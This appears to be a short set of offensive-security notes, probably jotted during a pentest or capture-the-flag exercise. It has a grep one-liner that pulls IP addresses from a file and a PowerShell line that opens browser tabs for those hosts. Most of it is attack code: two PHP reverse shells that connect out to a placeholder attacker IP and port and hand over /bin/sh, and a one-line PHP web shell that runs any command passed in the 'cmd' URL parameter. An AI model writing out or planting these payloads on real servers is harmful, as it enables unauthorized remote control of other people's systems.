1. Find all IPs in file: `grep -oP '(\d{1,3}\.){3}\d{1,3}' 80.txt > ips.txt`
2. (Get-Content "80.txt")[0..10] | ForEach-Object { Start-Process "http://$_" }
3. <?php
$ip = 'YOUR_IP';  // Replace with your IP
$port = YOUR_PORT;  // Replace with your port
$sock = fsockopen($ip, $port);  // Connect to your machine
exec("/bin/sh -i <&3 >&3 2>&3");  // Execute a shell
?>
<?php
$ip = 'YOUR_IP';  // Your IP address
$port = YOUR_PORT;  // Your listening port

$sock = fsockopen($ip, $port);  // Open socket to your machine
$proc = proc_open('/bin/sh', [
    0 => $sock,  // Input
    1 => $sock,  // Output
    2 => $sock   // Error
], $pipes);

// Keep the socket open until the connection is closed
proc_close($proc);
?>
//simple php shell
<?php
system($_GET['cmd']);
?>